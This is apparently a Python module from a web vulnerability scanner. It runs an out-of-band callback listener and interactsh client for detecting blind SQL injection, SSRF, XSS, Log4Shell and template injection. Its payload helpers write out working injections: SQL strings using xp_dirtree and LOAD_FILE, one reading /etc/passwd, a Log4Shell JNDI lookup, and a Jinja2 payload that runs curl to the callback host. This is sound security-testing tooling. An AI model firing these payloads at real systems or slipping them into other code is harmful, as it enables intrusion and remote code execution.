"""
core/oob.py — Out-of-Band (OOB) callback infrastructure

Blind vulnerabilities (blind SQLi, blind SSRF, blind XSS) cannot be detected by
inspecting HTTP responses alone.  This module provides callback URLs that the TARGET
must reach — proving exploitation.

Two modes (tried in order):
  1. Built-in async HTTP listener  — a lightweight asyncio HTTP server on a random
     high port.  Works when this machine is reachable from the target (same network,
     VPN, or public IP).  Zero external dependencies.

  2. interactsh server             — DNS+HTTP+SMTP out-of-band via projectdiscovery's
     interactsh.  Set `interactsh.server` in config.yaml to your server URL.
     Also works with public interactsh servers (oast.pro, oast.fun, oast.site).

Usage in modules:
    oob = ctx.get("oob")
    if oob and oob.active:
        token, cb_url = oob.register("ssrf_test_param_url")
        # inject cb_url into your payload
        ...
        # wait up to 5 s for the callback
        if await oob.wait_for(token, timeout=5.0):
            findings.append(...)
"""

import asyncio
import logging
import os
import random
import socket
import string
import time
import uuid
from urllib.parse import urlparse

import httpx

logger = logging.getLogger(__name__)

_CHARSET = string.ascii_lowercase + string.digits


def _rand(n: int = 8) -> str:
    return "".join(random.choices(_CHARSET, k=n))


# ── Built-in async HTTP listener ──────────────────────────────────────────────

class _OOBHandler(asyncio.Protocol):
    """Raw asyncio TCP handler that logs any HTTP request it receives."""

    def __init__(self, tracker: "OOBTracker"):
        self._tracker = tracker
        self._buf = b""

    def connection_made(self, transport):
        self._transport = transport

    def data_received(self, data: bytes):
        self._buf += data
        if b"\r\n\r\n" in self._buf or b"\n\n" in self._buf:
            self._handle()

    def _handle(self):
        try:
            header_block = self._buf.split(b"\r\n\r\n")[0].decode(errors="ignore")
            first_line = header_block.splitlines()[0]  # e.g. "GET /oob/abc123 HTTP/1.1"
            parts = first_line.split()
            if len(parts) >= 2:
                path = parts[1]
                token = path.strip("/").split("/")[-1]
                self._tracker._fire(token, {"method": parts[0], "path": path,
                                             "ts": time.time(), "raw": header_block[:500]})
        except Exception:
            pass
        finally:
            # Return a minimal HTTP 200 so the client doesn't retry
            try:
                self._transport.write(
                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
                )
                self._transport.close()
            except Exception:
                pass


# ── interactsh client ─────────────────────────────────────────────────────────

class _InteractshClient:
    """
    Minimal client for the projectdiscovery interactsh polling API.

    Registration is intentionally lightweight (no RSA/AES) — we just poll
    the public REST endpoint for interactions on our unique subdomain.
    The public servers (oast.pro etc.) support a simple correlation-id
    based polling endpoint for unauthenticated use.
    """

    def __init__(self, server: str):
        self._server = server.rstrip("/")
        self._session_id = _rand(12)
        self._callbacks: dict[str, list] = {}
        self._running = False
        self._task = None

    @property
    def subdomain(self) -> str:
        return f"{self._session_id}.{urlparse(self._server).hostname}"

    def url_for(self, token: str) -> str:
        return f"http://{token}.{self.subdomain}"

    async def start(self):
        self._running = True
        self._task = asyncio.create_task(self._poll_loop())
        logger.info(f"OOB interactsh client started: {self.subdomain}")

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()

    async def _poll_loop(self):
        poll_url = f"{self._server}/poll?id={self._session_id}&secret=none"
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            while self._running:
                try:
                    r = await client.get(poll_url)
                    if r.status_code == 200:
                        data = r.json()
                        for item in data.get("data", []):
                            raw = item.get("rawRequest", "") or item.get("raw-request", "")
                            full_id = item.get("full-id", "") or item.get("fullId", "")
                            token = full_id.split(".")[0] if "." in full_id else full_id
                            if token:
                                self._callbacks.setdefault(token, []).append({
                                    "ts": time.time(),
                                    "raw": raw[:500],
                                    "type": item.get("protocol", "http"),
                                })
                except Exception as e:
                    logger.debug(f"interactsh poll error: {e}")
                await asyncio.sleep(3)

    def check(self, token: str) -> list:
        return self._callbacks.get(token, [])


# ── Public OOBTracker ─────────────────────────────────────────────────────────

class OOBTracker:
    """
    Single instance per scan.  Created in pipeline.py, stored in ctx["oob"].

    call oob.register(label)  → (token, callback_url)
    call oob.check(token)     → list of callback records (may be empty)
    call await oob.wait_for(token, timeout) → bool
    """

    def __init__(self, cfg: dict):
        self._cfg = cfg
        self._callbacks: dict[str, list] = {}   # token → list of hit dicts
        self._server = None          # asyncio Server (built-in listener)
        self._host: str = ""
        self._port: int = 0
        self._interactsh: _InteractshClient | None = None
        self._events: dict[str, asyncio.Event] = {}
        self.active = False

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    async def start(self):
        """Start the OOB listener(s)."""
        # Try interactsh first (more reliable for external targets)
        ish_server = self._cfg.get("interactsh", {}).get("server", "")
        if ish_server:
            try:
                self._interactsh = _InteractshClient(ish_server)
                await self._interactsh.start()
                self.active = True
                logger.info("OOB: interactsh mode active")
                return
            except Exception as e:
                logger.warning(f"OOB: interactsh failed ({e}), falling back to built-in listener")

        # Built-in HTTP listener
        try:
            loop = asyncio.get_event_loop()
            self._server = await loop.create_server(
                lambda: _OOBHandler(self),
                host="0.0.0.0",
                port=0,  # OS assigns a free port
            )
            self._port = self._server.sockets[0].getsockname()[1]
            self._host = self._detect_ip()
            self.active = True
            logger.info(f"OOB: built-in listener on {self._host}:{self._port}")
        except Exception as e:
            logger.warning(f"OOB: built-in listener failed ({e}) — blind detection disabled")

    async def stop(self):
        if self._server:
            self._server.close()
        if self._interactsh:
            await self._interactsh.stop()

    # ── Token management ──────────────────────────────────────────────────────

    def register(self, label: str = "") -> tuple[str, str]:
        """
        Create a unique token and return (token, callback_url).
        Inject the callback_url into attack payloads.
        """
        token = _rand(10)
        self._callbacks[token] = []
        self._events[token] = asyncio.Event()

        if self._interactsh:
            url = self._interactsh.url_for(token)
        else:
            url = f"http://{self._host}:{self._port}/{token}"

        logger.debug(f"OOB token registered: {token} ({label})")
        return token, url

    def _fire(self, token: str, record: dict):
        """Called by the HTTP handler when a callback arrives."""
        self._callbacks.setdefault(token, []).append(record)
        ev = self._events.get(token)
        if ev:
            ev.set()
        logger.info(f"OOB callback received! token={token} path={record.get('path','?')}")

    def check(self, token: str) -> list:
        """Return all callbacks received for this token (non-blocking)."""
        hits = self._callbacks.get(token, [])
        # Also pull from interactsh if active
        if self._interactsh:
            hits = self._interactsh.check(token) or hits
        return hits

    async def wait_for(self, token: str, timeout: float = 6.0) -> bool:
        """
        Wait up to `timeout` seconds for a callback.
        Returns True if at least one callback arrived.
        """
        ev = self._events.get(token)
        if ev is None:
            return False
        try:
            await asyncio.wait_for(ev.wait(), timeout=timeout)
            return True
        except asyncio.TimeoutError:
            # Check interactsh one final time (may have polled between our checks)
            return bool(self.check(token))

    # ── OOB payload helpers ───────────────────────────────────────────────────

    def make_ssrf_payloads(self) -> list[tuple[str, str, str]]:
        """
        Return list of (token, callback_url, label) for SSRF testing.
        """
        token, url = self.register("ssrf")
        return [(token, url, "OOB SSRF callback")]

    def make_sqli_dns_payloads(self, param: str) -> list[tuple[str, str, str]]:
        """
        Return SQL payloads that trigger a DNS/HTTP lookup for blind SQLi.
        Supports MySQL LOAD_FILE (requires FILE priv), MSSQL xp_dirtree.
        """
        token, url = self.register(f"sqli_{param}")
        host = urlparse(url).netloc
        payloads = [
            (token, f"'; EXEC master..xp_dirtree '\\\\{host}\\x'--", "MSSQL xp_dirtree OOB"),
            (token, f"' UNION SELECT LOAD_FILE('\\\\{host}\\x')--", "MySQL LOAD_FILE OOB"),
            (token, f"'; SELECT pg_read_file('/etc/passwd');--", "PostgreSQL OOB"),
        ]
        return payloads

    def make_xss_payload(self) -> tuple[str, str]:
        """Return (token, XSS payload string) for blind XSS."""
        token, url = self.register("xss")
        payload = f'"><script src="{url}"></script>'
        return token, payload

    def make_log4shell_payload(self) -> tuple[str, str]:
        """Return (token, Log4Shell JNDI payload)."""
        token, url = self.register("log4shell")
        host = urlparse(url).netloc if "://" in url else url
        payload = f"${{jndi:ldap://{host}/log4shell}}"
        return token, payload

    def make_ssti_oob_payload(self) -> tuple[str, str]:
        """Return (token, SSTI OOB payload) that triggers HTTP lookup on execution."""
        token, url = self.register("ssti")
        # Jinja2 / Twig: use request module to fetch OOB URL
        payload = (
            f'{{% set x = lipsum.__globals__["os"].popen('
            f'"curl {url}").read() %}}'
        )
        return token, payload

    # ── Utility ───────────────────────────────────────────────────────────────

    @staticmethod
    def _detect_ip() -> str:
        """Best-effort detect this machine's public-facing IP."""
        # Try to determine outbound IP via a connection to a known address
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"
